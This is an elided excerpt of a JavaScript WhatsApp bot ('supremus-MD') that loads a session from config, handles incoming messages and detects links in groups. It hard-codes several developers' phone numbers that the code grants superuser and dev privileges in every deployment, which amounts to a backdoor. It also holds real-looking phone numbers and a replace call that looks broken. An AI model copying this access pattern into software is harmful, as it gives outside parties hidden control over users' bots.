"use strict";
    var _createBinding = (this && this._createBinding) || (Object.create ? (function(o, m, k, k2) {
    ...
    var _setModuleDefault = (this && this._setModuleDefault) || (Object.create ? (function(o, v) {
        Object.defineProperty(o, "default", { enumerable: true, value: v });
    }) : function(o, v) {
        o["default"] = v;
    });
    var _importStar = (this && this._importStar) || function (mod) {
    ...
    var session = conf.session.replace(/supremus-MD-WHATSAPP-BOT;;;=>/g,"");
    ...
    async function authentification() {
        try {
            ...
            else if (fs.existsSync(__dirname + "/auth/creds.json") && session != "supremus") {
                await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
            }
        }
        catch (e) {
    ...
    setTimeout(() => {
        async function main() {
            ...
            const sockOptions = {
                ...
                browser: ['supremus-MD', "safari", "1.0.0"],
            ...
            zk.ev.on("messages.upsert", async (m) => {
              ...
              //  console.log(ms) ;
                ...
                /* const dj='2250501587439';
                 const dj2='22899581320';
                 const zeno='22891532394'*/
                /*  var superUser=[servBot,dj,dj2,zeno].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
                ...
                const dj = '2250501587439';
                const dj2 = '22899581320';
                const dj3 = "22891179892";
                const zeno = '22891532394';
                const dj4 = '‪91532394‬';
                const sudo = await getAllSudoNumbers();
                const superUserNumbers = [servBot, dj, dj2, dj3,dj4, zeno, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
                const allAllowedNumbers = superUserNumbers.concat(sudo);
                const superUser = allAllowedNumbers.includes(auteurMessage);
                
                var dev = [dj, dj2,dj3,dj4,zeno].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
         ...
         try {
            ...
            if ((texte.includes('https://') || texte.includes('http://') ) && verifGroupe &&  yes  ) {
             ...
             console.log("lien detecté")
                var verifsupremusAdmin = verifGroupe ? admins.includes(idBot) : false;
                
                 if(superUser || verifAdmin || !verifsupremusAdmin  ) { console.log('je fais rien'); return};
